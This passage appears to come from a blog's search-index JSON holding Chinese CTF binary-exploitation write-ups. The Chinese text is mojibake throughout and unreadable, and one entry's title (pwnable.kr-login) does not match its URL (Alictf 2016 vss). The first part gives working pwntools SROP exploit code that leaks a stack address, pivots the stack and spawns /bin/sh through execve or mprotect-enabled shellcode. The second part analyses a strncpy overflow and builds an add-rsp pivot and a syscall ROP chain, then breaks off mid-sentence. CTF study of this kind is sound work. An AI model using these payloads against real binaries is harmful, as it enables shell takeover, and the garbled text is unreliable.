ˆåœ°å€ä¹‹åè¿”å›åˆ°startï¼Œæ‰§è¡Œä¸‹ä¸€æ­¥æ“ä½œã€‚\nio.send(payload)\nsleep(3)\nio.send(payload[8:8+1])\n```\n\n\\#åˆ©ç”¨sys_readéšä¾¿è¯»å–ä¸€ä¸ªå­—ç¬¦ï¼Œè®¾ç½®rax = 1ï¼Œç”±äºretnå…³ç³»ï¼Œrspä¸‹æ‹‰äº†ä¸€ä¸ªå•ä½ï¼Œæ‰€ä»¥è¿™é‡Œä¼šè¯»å…¥åˆ°åŸå…ˆçš„rsp+0x8å¤„ï¼Œä¹Ÿå°±æ˜¯ä»åŸå…ˆçš„Payloadä¸­ç¬¬8ä¸ªå­—ç¬¦å¼€å§‹ï¼ŒæŠ½å–ä¸€ä¸ªå­—ç¬¦ï¼Œå°±æ˜¯set_rsi_rdi_addrçš„æœ€åä¸€ä¸ªå­—èŠ‚ï¼Œä¸ºäº†ä¸æ”¹å˜è¿”å›åœ°å€ã€‚å¦‚æœå†™æˆï¼šio.send(â€˜\\xb8â€™)æ•ˆæœä¸€æ ·ï¼Œéƒ½æ˜¯ä¸ºäº†ä¸æ”¹å˜è¿”å›åœ°å€ã€‚ä¹‹åå†æ‰§è¡Œset_rsi_rdi_addrä»è€Œæ‰§è¡Œwriteå‡½æ•°ï¼Œ\n\n```\n#æ³¨é‡Šå¤´\n\nstack_addr = u64(io.recv()[8:16]) + 0x100\n#ä»æœ€åˆçš„rsp+0x10å¼€å§‹æ‰“å°400å­—èŠ‚æ•°æ®ï¼Œé‚£ä¹ˆä»æ³„éœ²çš„æ•°æ®ä¸­æŠ½å–æ ˆåœ°å€ï¼Œ+0x100é˜²æ­¢æ ˆæ•°æ®è¿‡è¿‘è¦†ç›–\nlog.info('stack addr = %#x' %(stack_addr))\n```\n\n7.è¿™é‡Œå¯ä»¥çœ‹åˆ°æˆåŠŸæ³„éœ²äº†ä¸€ä¸ªæ ˆåœ°å€ï¼Œä½†æ˜¯ä¸èƒ½å†ç”¨ç®€å•è¯»å…¥binshå­—ç¬¦ä¸²ä¹‹åè®¾ç½®SigreturnFrameç»“æ„ä½“æ¥getshellï¼Œå› ä¸ºè¿™é‡Œè®¾ç½®è¯»å…¥åœ°å€æ˜¯é€šè¿‡rspè®¾ç½®çš„ã€‚å¦‚æœå°†rspè®¾ç½®ä¸ºæˆ‘ä»¬æƒ³è¯»å…¥binshçš„æ ˆåœ°å€ï¼Œé‚£ä¹ˆè‚¯å®šæ˜¯å¯ä»¥è¯»å…¥binshå­—ç¬¦ä¸²çš„ï¼Œä½†æ˜¯å½“ç¨‹åºè¿è¡Œåˆ°retnæ—¶ï¼Œè·³è½¬çš„æ˜¯binshè¿™ä¸ªåœ°å€ï¼Œè¿™æ˜¯ä¸åˆæ³•çš„ï¼Œæ²¡åŠæ³•è·³è½¬ï¼Œç¨‹åºä¼šå´©æºƒã€‚\n\nè¿™é‡Œå°±è€ƒè™‘ä½¿ç”¨SigreturnFrame()æ¥è¿›è¡Œæ ˆåŠ«æŒï¼Œå°†æ•´ä¸ªæ ˆæŒªç§»åˆ°ç›®çš„åœ°ã€‚\n\n(1)é¦–å…ˆå¸ƒç½®SigreturnFrame()çš„æ ˆç©ºé—´ï¼Œè¿›è¡Œæ ˆåŠ«æŒï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nframe_read = SigreturnFrame() \n#è®¾ç½®readçš„SROPå¸§ï¼Œä¸ä½¿ç”¨åŸå…ˆçš„readæ˜¯å› ä¸ºå¯ä»¥ä½¿ç”¨SROPåŒæ—¶ä¿®æ”¹rspï¼Œå®ç°stack pivot\nframe_read.rax = constants.SYS_read#è°ƒç”¨readè¯»å–payload2\nframe_read.rdi = 0#fdå‚æ•°\nframe_read.rsi = stack_addr#è¯»å–payload2åˆ°rsiå¤„\nframe_read.rdx = 0x300#è¯»å–é•¿åº¦ä¸º0x300\n#è¯»å–çš„å¤§å°\nframe_read.rsp = stack_addr#è®¾ç½®SROPæ‰§è¡Œå®Œçš„rspä½ç½®\n#è®¾ç½®æ‰§è¡ŒSROPä¹‹åçš„rspä¸ºstack_addrï¼Œé‡Œé¢å­˜çš„æ˜¯start_addrï¼ŒretnæŒ‡ä»¤æ‰§è¡Œåä»startå¼€å§‹ã€‚\nframe_read.rip = syscall_addr#è®¾ç½®SROPä¸­çš„ä¸€æ®µä»£ç æŒ‡ä»¤\n```\n\n(2)å‘é€payloadã€‚\n\n```\n#æ³¨é‡Šå¤´\n\npayload1 = \"\"\npayload1 += p64(start_addr)#è¯»å–payload[8:8+15]ï¼Œè®¾ç½®rax=0xf0\npayload1 += p64(syscall_addr)#åˆ©ç”¨rax=0xf0,è°ƒç”¨SROP\npayload1 += str(frame_read)\nio.send(payload1)\nsleep(3)\nio.send(payload1[8:8+15])\n#ä¸ºraxèµ‹å€¼ä¸º0xf0\nsleep(3)\n```\n\nç¨‹åºè¿è¡ŒSROPè¿‡ç¨‹ä¸­ï¼Œä¼šæ‰§è¡Œreadå‡½æ•°ï¼Œå°†payload2è¯»å–åˆ°stack_addrå¤„ï¼Œæ‰€ä»¥å½“ç¨‹åºè¿è¡Œå®ŒSROPåï¼Œæ ˆé¡¶rspè¢«åŠ«æŒåˆ°stack_addrå¤„ï¼ŒåŒæ—¶stack_addrä¸Šä¿å­˜çš„å†…å®¹æ˜¯payload2ï¼Œé¦–åœ°å€æ˜¯startï¼Œæ‰€ä»¥retnæ‰§è¡Œåä»æ—§ä»startå¼€å§‹ã€‚\n\n(3)è®¾ç½®ç¬¬äºŒæ¬¡çš„SigreturnFrameæ”»å‡»ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nframe_execve = SigreturnFrame()\n#è®¾ç½®execveçš„SROPå¸§ï¼Œæ³¨æ„è®¡ç®—/bin/sh\\x00æ‰€åœ¨åœ°å€\nframe_execve.rax = constants.SYS_execve\nframe_execve.rdi = stack_addr+0x108\nframe_execve.rip = syscall_addr\n```\n\nè¿™é‡Œçš„0x108æ˜¯è®¡ç®—å‡ºæ¥çš„ï¼Œéœ€è¦è®¡ç®—ä»stack_addråˆ°rdiï¼Œä¹Ÿå°±æ˜¯binshå­—ç¬¦ä¸²çš„è·ç¦»ã€‚ç”±äºä¼ è¿›å»çš„æ˜¯ç»“æ„ä½“ï¼Œå¤§å°ä¸º0xf8ã€‚å‰ä¸€ä¸ªä¾‹å­ä¸­binshå­—ç¬¦ä¸²æ˜¯æ”¾åœ¨str(frameExecve)ä¹‹å‰ï¼Œæ‰€ä»¥æ²¡æœ‰é‚£ä¹ˆå¤§ã€‚è¿™é‡Œå´æ˜¯æ”¾åœ¨str(frame_execve)ä¹‹åï¼Œæ‰€ä»¥ä»stack_addrä¸ºèµ·å§‹ï¼Œstart_addrï¼Œsyscall_addrï¼Œframe_execve)ï¼Œæ€»å…±ä¸º0xf8+0x08*2=0x108ï¼Œè¿™é‡Œä¸å¤ªæ‡‚å¯ä»¥è°ƒè¯•ä¸€ä¸‹çœ‹çœ‹ã€‚ä¹Ÿå°±æ˜¯å†ä¸€æ¬¡start_addrè¯»å–å­—ç¬¦ä¸²binshçš„ä½ç½®ã€‚\n\n8.å‘é€payloadï¼Œè¯»å–binshå­—ç¬¦ä¸²ï¼Œgetshellï¼š\n\n```\n#æ³¨é‡Šå¤´\n\npayload2 = \"\"\npayload2 += p64(start_addr)#å¤„åœ¨stack_addrå¤„ï¼Œè¯»å–payload[8:8+15]ï¼Œè®¾ç½®rax=0xf0\npayload2 += p64(syscall_addr)#å¤„åœ¨stack_addr+0x08,åˆ©ç”¨rax=0xf0,è°ƒç”¨SROP\npayload2 += str(frame_execve)#å¤„åœ¨stack_addr+0x10\npayload2 += \"/bin/sh\\x00\"#å¤„åœ¨stack+0x108å¤„\nio.send(payload2)\nsleep(3)\nio.send(payload2[8:8+15])\nsleep(3)\nio.interactive()\n```\n\n9.å°è¯•ä½¿ç”¨mprotectä¸ºæ ˆå†…å­˜æ·»åŠ å¯æ‰§è¡Œæƒé™xï¼Œä»è€Œshellcodeæ¥getshellã€‚\n\n(1)ç¬¬ä¸€æ®µçš„åŠ«æŒæ ˆå’Œè¯»å–payload2è¿›å…¥åŠ«æŒæ ˆå¤„éƒ½æ˜¯ä¸€æ ·çš„\n\n```\n#æ³¨é‡Šå¤´\n\nframe_read = SigreturnFrame()#è®¾ç½®readçš„SROPå¸§\nframe_read.rax = constants.SYS_read\nframe_read.rdi = 0\nframe_read.rsi = stack_addr\nframe_read.rdx = 0x300\nframe_read.rsp = stack_addr\n#è¯»å–payload2ï¼Œè¿™ä¸ªstack_addråœ°å€ä¸­çš„å†…å®¹å°±æ˜¯startåœ°å€ï¼ŒSROPæ‰§è¡Œå®Œåretè·³è½¬åˆ°start\nframe_read.rip = syscall_addr\n```\n\n(2)ç¬¬äºŒæ®µéœ€è¦è°ƒç”¨mprotectæ¥ä¿®æ”¹æƒé™ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nframe_mprotect = SigreturnFrame()\n#è®¾ç½®mprotectçš„SROPå¸§ï¼Œç”¨mprotectä¿®æ”¹æ ˆå†…å­˜ä¸ºRWX\nframe_mprotect.rax = constants.SYS_mprotect\nframe_mprotect.rdi = stack_addr & 0xFFFFFFFFFFFFF000\nframe_mprotect.rsi = 0x1000\nframe_mprotect.rdx = constants.PROT_READ | constants.PROT_WRITE | constants.PROT_EXEC\n#æƒé™ä¸ºR,W,X\nframe_mprotect.rsp = stack_addr\n#åŠ«æŒæ ˆåœ°å€rsp\nframe_mprotect.rip = syscall_addr\n```\n\n(3)æœ€åçš„shellcode:\n\n```\n#æ³¨é‡Šå¤´\n\npayload2 = \"\"\npayload2 += p64(stack_addr+0x10) #å¤„åœ¨stack_addr\n#SROPæ‰§è¡Œå®Œåï¼Œretåˆ°stack_addr+0x10å¤„çš„ä»£ç ï¼Œå³æ‰§è¡Œshellcode\npayload2 += asm(shellcraft.amd64.linux.sh())#å¤„åœ¨stack_addr+0x10\nio.send(payload2)\nsleep(3)\nio.interactive()\n```\n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n\n \n","tags":["SROP"],"categories":["PWN","SROP0x8"]},{"title":"pwnable.kr-login","url":"/2021/08/14/Alictf 2016-vss/","content":"\n1.å¸¸è§„checksec,å¼€äº†NXä¿æŠ¤ï¼ŒIDAæ‰“å¼€æ‰¾æ¼æ´ï¼Œå‘ç°ç¨‹åºç‰¹åˆ«å¥‡æ€ªï¼Œæ²¡æœ‰mainå‡½æ•°ï¼Œè¿™é‡Œåº”è¯¥æ˜¯æŠŠelfæ–‡ä»¶çš„ç¬¦å·ä¿¡æ¯ç»™æ¸…é™¤äº†ã€‚æ­£å¸¸æƒ…å†µä¸‹ç¼–è¯‘å‡ºæ¥çš„æ–‡ä»¶é‡Œé¢å¸¦æœ‰ç¬¦å·ä¿¡æ¯å’Œè°ƒè¯•ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯åœ¨è°ƒè¯•çš„æ—¶å€™éå¸¸æœ‰ç”¨ï¼Œä½†æ˜¯å½“æ–‡ä»¶å‘å¸ƒæ—¶ï¼Œè¿™äº›ç¬¦å·ä¿¡æ¯ç”¨å¤„ä¸å¤§ï¼Œå¹¶ä¸”ä¼šå¢å¤§æ–‡ä»¶å¤§å°ï¼Œè¿™æ—¶å¯ä»¥æ¸…é™¤æ‰å¯æ‰§è¡Œæ–‡ä»¶çš„ç¬¦å·ä¿¡æ¯å’Œè°ƒè¯•ä¿¡æ¯ï¼Œæ–‡ä»¶å°ºå¯¸å¯ä»¥å¤§å¤§å‡å°ã€‚å¯ä»¥ä½¿ç”¨stripå‘½ä»¤å®ç°æ¸…é™¤ç¬¦å·ä¿¡æ¯çš„ç›®çš„ã€‚\n\n2.è™½ç„¶è¿™é‡Œæ‰¾ä¸åˆ°mainå‡½æ•°ï¼Œä½†æ˜¯startå‡½æ•°æ˜¯ä¸€å®šä¼šå­˜åœ¨çš„ï¼Œç”±äºstartæŒ‰F5åæ±‡ç¼–ä¸æˆåŠŸï¼Œæ‰€ä»¥è¿™é‡Œè¿›å…¥åˆ°startå‡½æ•°çš„æ±‡ç¼–ä»£ç ä¸­ï¼š\n\nç”±äºstartä¸­çš„ç»“æ„åŸºæœ¬å›ºå®šï¼Œæœ€ååŸºæœ¬ä¸Šéƒ½æ˜¯å¦‚ä¸‹ï¼Œæ‰€ä»¥è¿™é‡Œsub_4011B1å…¶å®å°±æ˜¯mainå‡½æ•°ï¼Œè¿™é‡Œå°±å¯ä»¥ç‚¹è¿›å»çœ‹äº†ã€‚\n\n```\n#æ³¨é‡Šå¤´\n\nmov     rdi, offset main\ncall    _libc_start_main\n```\n\n2.è¿™é‡Œçš„mainå‡½æ•°å¯ä»¥åæ±‡ç¼–æˆåŠŸï¼Œé‚£ä¹ˆå°±å¼€å§‹åˆ†ææ¼æ´ã€‚ç¬¬ä¸€ä¸ªå‡½æ•°æ˜¯sub_4374E0ï¼Œè¿›å»ä¹‹åå¦‚ä¸‹\n\n```\n#æ³¨é‡Šå¤´\n\nsigned __int64 result; // rax\nresult = 37LL;\n__asm { syscall; LINUX - sys_alarm }\n```\n\nä½¿ç”¨ç³»ç»Ÿè°ƒç”¨å·37ï¼Œä¹Ÿå°±æ˜¯0x25ï¼Œä»£è¡¨alarmã€‚\n\n3.sub_408800å­—ç¬¦ä¸²å•å‚æ•°ï¼Œä¸”å‚æ•°éƒ½è¢«æ‰“å°åˆ°å±å¹•ä¸Šï¼Œå¯ä»¥çŒœæµ‹æ˜¯putsã€‚sub_437EA0è°ƒç”¨sub_437EBDï¼Œå¹¶ä¸”fdå‚æ•°ä½ä¸º0å·ï¼Œä¸”æ¥æ”¶ä¸‰ä¸ªå‚æ•°ï¼Œçœ‹ä¸‹æ±‡ç¼–ä»£ç ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nmov       eax, 0\nsyscall;  LINUX - sys_read\n```\n\nè°ƒç”¨0å·syscallï¼Œæ¨æµ‹ä¸ºreadå‡½æ•°ã€‚(ç³»ç»Ÿè°ƒç”¨å·æœ‰)\n\n4.è¿›å…¥sub_40108Eå‡½æ•°ä¸­åˆ†æï¼Œè¿™ä¸ªå‡½æ•°å¤„ç†äº†æˆ‘ä»¬çš„è¾“å…¥ï¼Œå¯ä»¥è¯´å°±æ˜¯å…³é”®å‡½æ•°äº†ã€‚çœ‹åŠå¤©å•¥ä¹Ÿæ²¡çœ‹æ‡‚ï¼Œç›´æ¥ä¸Šè°ƒè¯•ã€‚å…ˆè¾“å…¥åå‡ ä¸ªAçœ‹çœ‹ï¼Œå‘ç°ç»è¿‡sub_400330å‡½æ•°ä¹‹åï¼Œå†…å­˜ä¸­è¾“å…¥çš„Aï¼Œä¹Ÿå°±æ˜¯a1å¤„çš„å†…å®¹è¢«å¤åˆ¶åˆ°äº†v2ï¼Œè¿™é‡Œå…ˆçŒœæµ‹æ˜¯ä¸ªç±»ä¼¼strncpyå‡½æ•°çš„ä¸œè¥¿ã€‚ç„¶åçœ‹å†…å®¹ï¼Œæ—¢ç„¶å±€éƒ¨å˜é‡v2åªæœ‰0x40,è€Œè¿™ä¸ªå¤åˆ¶å‡½æ•°çš„çš„å‚æ•°æœ‰80,ä¹Ÿå°±æ˜¯0x50ï¼Œå¤šäº†0x10ã€‚é‚£ä¹ˆå†è°ƒè¯•çœ‹çœ‹ï¼Œè¾“å…¥0x48ä¸ªå­—èŠ‚Aï¼Œå‘ç°sub_40108Eå‡½æ•°çš„ebpè¢«æˆ‘ä»¬æ”¹æ‰äº†ï¼š\n\nsub_400330((__int64)&v2, a1, 80LL);\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191549889.jpeg)\n\nä½†æ˜¯ç¨‹åºæ¥ç€è¿è¡Œä¸‹å»å´ä¸å¤ªè¡Œï¼Œé™·å…¥äº†å¾ªç¯ï¼Œç„¶åä¸€ç›´è¿è¡Œåå´©æºƒï¼Œè¿ä¹‹åçš„read(v8, (__int64)&v3, 40LL);è¿™æ®µreadä»£ç éƒ½æ²¡æœ‰è¿è¡Œã€‚\n\n5.å†è§‚å¯Ÿä¸‹ç¨‹åºï¼Œæœ‰ä¸ªä»£ç æœ‰æ„æ€ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nsub_400330((__int64)&v2, a1, 0x50LL);\nif ( (_BYTE)v2 == 'p' && BYTE1(v2) == 'y' )\n    return 1LL;\n```\n\nåœ¨å¤åˆ¶å®Œå­—ç¬¦ä¸²ä¹‹åè¿›å…¥ä¸€ä¸ªåˆ¤æ–­è¯­å¥ï¼Œå¦‚æœå¼€å¤´æ˜¯pyï¼Œå°±ç›´æ¥retnï¼Œä¸ç»è¿‡ä¸‹é¢ä»£ç ï¼Œæ‰€ä»¥æˆ‘ä»¬å®Œå…¨å¯ä»¥åœ¨è¿™å°±ç›´æ¥è¿”å›ã€‚ä½†æ˜¯è¿™é‡Œæœ‰ä¸ªé—®é¢˜ï¼Œè¿™ä¸ªreturnæœ‰æ²¡æœ‰æ±‡ç¼–æŒ‡ä»¤é‡Œçš„leaveæ“ä½œå‘¢ï¼Œå¦‚æœæ²¡æœ‰ï¼Œé‚£rspä»ç„¶åœ¨æœ€å‰é¢ï¼Œä¸ä¼šè·³è½¬åˆ°è¿”å›åœ°å€çš„åœ°æ–¹ï¼Œçœ‹æ±‡ç¼–ä»£ç ï¼Œå¯ä»¥çœ‹åˆ°æœ€åæ˜¯é€šè¿‡åˆ¤æ–­åè·³è½¬åˆ°äº†locret_40011AFï¼Œè€Œè¿™æ®µåœ°å€é‡Œå°±æ˜¯leaveå’Œretnçš„æ±‡ç¼–æ“ä½œï¼Œèƒ½å¤Ÿå°†rspæ‹‰åˆ°è¿”å›åœ°å€å¤„ï¼Œé‚£ç›´æ¥returnå°±å®Œäº‹äº†ã€‚![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191550236.jpeg)\n\n6.é‚£ä¹ˆè¿™é‡Œå°±å¯ä»¥åˆ¤æ–­å‡ºæ¥æˆ‘ä»¬çš„è¾“å…¥ä¼šè¢«å¤åˆ¶åˆ°v2è¿™ä¸ªå±€éƒ¨å˜é‡ä¸­ï¼Œå¹¶ä¸”æœ€å¤š0x50ï¼Œä¹Ÿå°±æ˜¯è¯´é™¤å¼€rbpï¼Œæˆ‘ä»¬å¯ä»¥å†æ§åˆ¶ä¸€ä¸ªè¯¥å‡½æ•°çš„è¿”å›åœ°å€ã€‚é‚£ä¹ˆå¼€å§‹å°è¯•å‘—ã€‚ç”±äºåªæœ‰ä¸€ä¸ªè¿”å›åœ°å€ï¼Œæ²¡æœ‰åé—¨ç¨‹åºï¼Œæœ€å…ˆæƒ³åˆ°çš„è‚¯å®šæ˜¯onegadgetï¼Œä½†æ˜¯ä¸çŸ¥é“libcç‰ˆæœ¬ï¼Œæ²¡åŠæ³•onegadgetã€‚é‚£åªæœ‰ä¸€ä¸ªè¿”å›åœ°å€å¯ä»¥åšä»€ä¹ˆï¼Œé‚£ä¹ˆåªæœ‰æ ˆåŠ«æŒäº†ã€‚å…¶å®ƒWPå¤§å¤šéƒ½æ˜¯æŠ¬é«˜rspï¼Œæˆ‘æƒ³å¯ä¸å¯ä»¥é™ä½rspï¼Œé€šè¿‡ä¸€æ¬¡payloadæ¥getshellï¼Œä¹Ÿå°±æ˜¯é€šè¿‡ROPgadgetæœç´¢sub rspï¼Œä½†æ˜¯æœå‡ºæ¥çš„éƒ½ä¸å¤ªè¡Œï¼Œè¦ä¹ˆå¤ªå¤§ï¼Œè¶…è¿‡0x50ï¼Œè¦ä¹ˆå°±å¾ˆå¥‡æ€ªã€‚ç„¶åä¸€èˆ¬æ ˆåŠ«æŒéœ€è¦ä¸€ä¸ªretæ¥æ¥ç€æ§åˆ¶ç¨‹åºæµï¼Œè¿™é‡Œä¹Ÿæ²¡æœåˆ°ã€‚åŒæ—¶ç”±äºä½¿ç”¨çš„å¤åˆ¶å‡½æ•°ç»è¿‡è°ƒè¯•å°±æ˜¯strncpyï¼Œå­—ç¬¦ä¸²é‡Œä¸èƒ½æœ‰\\x00ï¼Œå¦åˆ™ä¼šè¢«å½“åšå­—ç¬¦ä¸²æˆªæ–­ä»è€Œæ— æ³•å¤åˆ¶æ»¡0x50å­—èŠ‚åˆ¶é€ å¯æ§æº¢å‡ºï¼Œè¿™å°±æ„å‘³ç€ä»»ä½•åœ°å€(å› ä¸ºåœ°å€åŸºæœ¬éƒ½ä¼šåœ¨æœ€å¼€å§‹å¸¦ä¸Š00)éƒ½ä¸èƒ½è¢«å†™åœ¨å‰0x48ä¸ªå­—èŠ‚ä¸­ï¼Œå½»åº•æ–­äº†sub rspçš„å¿µæƒ³ã€‚æ‰€ä»¥è¿˜æ˜¯æŠ¬é«˜æ ˆå§ã€‚ä½†æ˜¯æŠ¬é«˜æ ˆä¹Ÿæœ‰ç‚¹é—®é¢˜ï¼Œå°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„è¢«å¤åˆ¶çš„åªæœ‰0x50ä¸ªå­—èŠ‚ï¼ŒæŠ¬é«˜æœ‰å•¥ç”¨ï¼Œä¸å¯æ§å•Šã€‚ç„¶åå°±æƒ³åˆ°ä¹‹å‰çš„readå‡½æ•°ï¼Œè¯»äº†400ä¸ªå­—èŠ‚ï¼Œè€Œç´§æ¥ç€å°±æ˜¯è°ƒç”¨è¯¥å‡½æ•°ã€‚åˆšå¥½å±€éƒ¨å˜é‡v2ç¬¬ä¸€ä¸ªè¢«å‹æ ˆï¼Œä¸sub_40108Eå‡½æ•°æ ˆçš„æ ˆåº•ç´§ç´§æŒ¨åœ¨ä¸€èµ·ï¼Œä¹Ÿå°±æ˜¯è¯´è¶Šè¿‡sub_40108Eå‡½æ•°æ ˆçš„æ ˆåº•å’Œè¿”å›åœ°å€å°±å¯ä»¥ç›´æ¥æ¥åˆ°mainå‡½æ•°æ ˆã€‚è€Œmainå‡½æ•°æ ˆä¸­åˆåªæœ‰ä¸€ä¸ªæˆ‘ä»¬è¾“å…¥çš„å±€éƒ¨å˜é‡v4ï¼Œæ‰€ä»¥sub_40108Eå‡½æ•°æ ˆçš„è¿”å›åœ°å€ä¹‹åçš„ç¬¬ä¸€ä¸ªåœ°å€å°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„å±€éƒ¨å˜é‡v4çš„åœ°å€ã€‚(è¿™é‡Œé€šè¿‡è°ƒè¯•ä¹Ÿå¯ä»¥å‘ç°)\n\n7.é‚£ä¹ˆç»è¿‡è®¡ç®—ï¼Œå…¶å®åªè¦æœ‰ä¸€ä¸ªpop,retæ“ä½œï¼Œè®©rspæŠ¬é«˜ä¸€ä¸‹å°±å¯ä»¥åˆ°è¾¾æˆ‘ä»¬è¾“å…¥çš„é¦–åœ°å€ã€‚ä½†æ˜¯ç”±äºç»è¿‡å‰é¢åˆ†æï¼Œæˆ‘ä»¬éœ€è¦åœ¨ç¨‹åºå¼€å¤´è¾“å…¥pyæ¥ä½¿å¾—è¯¥å‡½æ•°ç›´æ¥returnï¼Œé‚£ä¹ˆå¦‚æœåªæ˜¯ä¸€ä¸ªpop,retæ“ä½œï¼Œé‚£ä¹ˆç¨‹åºç¬¬ä¸€ä¸ªæ‰§è¡Œçš„ä»£ç å°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„å¼€å¤´ï¼ŒåŒ…å«äº†pyçš„å¼€å¤´ï¼Œè¿™å°±å®Œå…¨ä¸å¯æ§äº†ï¼Œå¼€å¤´å¦‚æœæ˜¯pyé‚£æ€ä¹ˆè®¡ç®—æ‰èƒ½æ˜¯ä¸€ä¸ªæœ‰æ•ˆåœ°å€å‘¢ã€‚\n\n8.é‚£ä¹ˆå°±åªèƒ½æŸ¥æ‰¾add rspï¼Œåªè¦æ»¡è¶³add rsp 0x50ä¹‹ä¸Šå°±å¯ä»¥å®Œå…¨æ“æ§äº†ã€‚è¿™é‡Œè‡³å°‘éœ€è¦0x50ä¹Ÿæ˜¯å› ä¸ºè¿™æ˜¯strncpyï¼Œä¸èƒ½å°†åœ°å€å†™åˆ°å‰0x48ä¸ªå­—èŠ‚ï¼Œå¦åˆ™ä¼šæˆªæ–­ï¼Œè€Œæœ€åè¿”å›åœ°å€çš„è¦†ç›–å¯ä»¥è¢«å®Œå…¨å¤åˆ¶æ˜¯è¿™é‡Œæœ¬æ¥å°±æ˜¯ä¸€ä¸ªè¿”å›åœ°å€ï¼Œä¿å­˜çš„å†…å®¹åº”è¯¥æ˜¯00401216ï¼Œä¹Ÿå°±æ˜¯ä¹‹å‰call sub_40108Eçš„ä¸‹ä¸€æ®µåœ°å€ã€‚è¿™é‡Œåœ¨å¤åˆ¶çš„æ—¶å€™è‚¯å®šè¢«æˆªæ–­äº†ï¼Œä½†æ˜¯ç”±äºæœ¬æ¥å°±æ˜¯æ‰¾åˆ°ä¸€ä¸ªå¯ç”¨çš„åœ°å€ï¼Œæˆªæ–­äº†è¦†ç›–çš„ä¹Ÿåªæ˜¯å°†401216æ¢æˆäº†add rsp 0x58;retè¿™ä¸ªåœ°å€(å¦‚æœæˆ‘ä»¬çš„add rspçš„æœ‰æ•ˆåœ°å€åœ°æ–¹åŒ…å«äº†00ï¼Œé‚£æŒ‡å®šä¼šå‡ºé”™)ã€‚é‚£ä¹ˆpayloadçš„è¯­å¥åº”è¯¥æ˜¯payload = \"py\" + \"a\"*(0x48-0x02) + add_rsp_addr + padding + å®é™…æ§åˆ¶ä»£ç ã€‚\n\n9.åˆ©ç”¨ROPgadgetæœç´¢add espçš„ç›¸å…³å†…å®¹ï¼Œå¯ä»¥æŸ¥åˆ°ä¸€ä¸ªåœ°å€0x46f205ï¼Œæ“ä½œæ˜¯add rsp, 0x58; retï¼Œè¿™æ ·å°±å¯ä»¥é¡ºåˆ©å°†æ ˆæŠ¬å‡åˆ°0x58çš„åœ°æ–¹ï¼Œæ‰€ä»¥payloadçš„ç»„æˆåº”è¯¥æ˜¯ï¼špayload = â€œpyâ€ + â€œaâ€*0x46 + p64(0x46f205) + â€œaâ€*8 + p64(addr2)+...(a*8æ˜¯ç”¨æ¥å¡«å……çš„ï¼Œå› ä¸ºæŠ¬å‡åˆ°äº†0x58å¤„ï¼Œå¤åˆ¶ä¹‹å0x50å¤„æ˜¯ä¸€æ®µç©ºç™½åœ°æ–¹ï¼Œæ‰€ä»¥è¿˜éœ€è¦å¡«å……ä¸€ä¸‹ä½¿p64(addr2)èƒ½é¡ºåˆ©è¢«æŠ¬å‡è‡³0x58å¤„è¢«æ‰§è¡Œ)ã€‚åé¢çš„p64(addr2)å’Œ...å°±æ˜¯æˆ‘ä»¬çš„å¸¸è§„gadgetæ“ä½œäº†ã€‚\n\n10.ç°åœ¨éœ€è¦systemå‡½æ•°å’Œ/bin/shå­—ç¬¦ä¸²äº†ã€‚æ²¡æœ‰Libcï¼Œsystemå‡½æ•°å’Œ/bin/shä¹Ÿæ²¡æœ‰ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦è¾“å…¥/bin/shå­—ç¬¦ä¸²ï¼Œç„¶åsystemå‡½æ•°éœ€è¦é€šè¿‡syscallæ¥å®ç°ã€‚(64ä½ç¨‹åºä¸‹æ˜¯syscallå‡½æ•°ï¼Œ32ä½ç¨‹åºä¸‹å°±æ˜¯Int 0x80)\n\n11.è¿™é‡Œå…ˆå®Œæˆbinshçš„è¾“å…¥ï¼špayload = p64(pop_rdx) + p64(rdx_value) + p64(pop_rsi) + p64(rsi_value) + p64(pop_rdi) + p64(rdi_value) + p64(pop_rax)+ p64(rax_value) + p64(syscall)å› ä¸ºæ˜¯64ä½ç¨‹åºï¼Œå‡½æ•°ä»å·¦å¾€å³è¯»å–å‚æ•°æ‰€å–å¯„å­˜å™¨ä¾æ¬¡ä¸ºï¼šrdiï¼Œrsiï¼Œrdx, rcx, r8, r9, æ ˆä¼ é€’ï¼Œä½†æ˜¯å®é™…æƒ…å†µä¸­æ˜¯ä»å³å¾€å·¦è¯»å–å‚æ•°ï¼Œä¹Ÿå°±æ˜¯å½“åªæœ‰ä¸‰ä¸ªå‚æ•°æ—¶ï¼Œè¯»å–é¡ºåºåº”è¯¥æ˜¯rdx,rsi,rdiå¯¹åº”çš„ä¸ºread(rdi,rsi,rdx)ã€‚\n\nè¿™é‡Œrdxæ˜¯è¾“å…¥çš„å¤§å°ï¼Œrsiæ˜¯è¾“å…¥çš„å†…å­˜åœ°å€buf(éšä¾¿æ‰¾ä¸€æ®µå¯è¯»å¯å†™çš„å°±è¡Œäº†)ï¼Œrdiæ˜¯fdæ ‡å¿—ä½ï¼Œç”±äºæ˜¯é€šè¿‡syscallè°ƒç”¨ï¼Œæ‰€ä»¥é™¤äº†é…ç½®ä¸‰ä¸ªreadå‡½æ•°å‚æ•°è¿˜éœ€è¦é…ç½®ç³»ç»Ÿè°ƒç”¨å·ï¼Œä¹Ÿå°±æ˜¯raxçš„ä¼ å‚ä¸º0x0ã€‚![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191549806.jpeg)è¿™é‡Œå¦‚æœä¸ä½¿ç”¨syscallï¼Œå…¶å®ä¹Ÿå¯ä»¥ç”¨æˆ‘ä»¬ä¹‹å‰çŒœå‡ºæ¥çš„readå‡½æ•°çš„pltè¡¨ï¼Œåªæ˜¯è¿™æ ·å°±å¯ä»¥ä¸ç”¨è®¾ç½®raxäº†ã€‚\n\nâ–²è¿™é‡Œä¸èƒ½ä½¿ç”¨401202å¤„çš„call readï¼Œå› ä¸ºcallä¼šå‹å…¥ä¸‹ä¸€è¡Œä»£ç 